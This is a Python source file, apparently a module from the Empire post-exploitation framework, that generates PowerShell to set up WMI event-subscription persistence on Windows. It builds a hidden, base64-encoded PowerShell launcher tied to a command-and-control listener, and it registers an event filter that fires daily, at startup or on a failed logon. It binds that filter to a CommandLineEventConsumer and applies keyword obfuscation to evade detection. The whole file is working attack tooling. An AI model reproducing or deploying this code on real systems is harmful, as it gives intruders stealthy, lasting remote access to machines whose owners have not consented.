from __future__ import print_function

import os
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        listener_name = params['Listener']

        # trigger options
        daily_time = params['DailyTime']
        at_startup = params['AtStartup']
        sub_name = params['SubName']
        failed_logon = params['FailedLogon']

        # management options
        ext_file = params['ExtFile']
        cleanup = params['Cleanup']

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']

        status_msg = ""
        location_string = ""

        if cleanup.lower() == 'true':
            # commands to remove the WMI filter and subscription
            script = "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='" + sub_name + "'\"| Remove-WmiObject;"
            script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + sub_name + "'\" | Remove-WmiObject;"
            script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + sub_name + "'} | Remove-WmiObject;"
            script += "'WMI persistence removed.'"
            script = data_util.keyword_obfuscation(script)
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
            return script

        if ext_file != '':
            # read in an external file as the payload and build a
            #   base64 encoded version as encScript
            if os.path.exists(ext_file):
                f = open(ext_file, 'r')
                fileData = f.read()
                f.close()

                # unicode-base64 encode the script for -enc launching
                enc_script = helpers.enc_powershell(fileData)
                status_msg += "using external file " + ext_file

            else:
                return handle_error_message("[!] File does not exist: " + ext_file)

        else:
            if listener_name == "":
                return handle_error_message("[!] Either an ExtFile or a Listener must be specified")

            # if an external file isn't specified, use a listener
            elif not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listener_name)

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                                   userAgent=user_agent, proxy=proxy,
                                                                   proxyCreds=proxy_creds)

                enc_script = launcher.split(" ")[-1]
                status_msg += "using listener " + listener_name

        # sanity check to make sure we haven't exceeded the powershell -enc 8190 char max
        if len(enc_script) > 8190:
            return handle_error_message("[!] Warning: -enc command exceeds the maximum of 8190 characters.")

        # built the command that will be triggered
        trigger_cmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + enc_script

        if failed_logon != '':

            # Enable failed logon auditing
            script = "auditpol /set /subcategory:Logon /failure:enable;"

            # create WMI event filter for failed logon
            script += "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{Name='" + sub_name + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode='4625' AND TargetInstance.Message LIKE '%" + failed_logon + "%'\"}; "
            status_msg += " with trigger upon failed logon by " + failed_logon

        elif daily_time != '':

            parts = daily_time.split(":")

            if len(parts) < 2:
                return handle_error_message("[!] Please use HH:mm format for DailyTime")

            hour = parts[0]
            minutes = parts[1]

            # create the WMI event filter for a system time
            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + sub_name + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = " + hour + " AND TargetInstance.Minute= " + minutes + " GROUP WITHIN 60\"};"
            status_msg += " WMI subscription daily trigger at " + daily_time + "."

        else:
            # create the WMI event filter for OnStartup
            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + sub_name + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
            status_msg += " with OnStartup WMI subsubscription trigger."

        # add in the event consumer to launch the encrypted script contents
        script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='" + sub_name + "';CommandLineTemplate=\"" + trigger_cmd + "\";RunInteractively='false'};"

        # bind the filter and event consumer together
        script += " Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"

        script += "'WMI persistence established " + status_msg + "'"

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script,
                                       obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
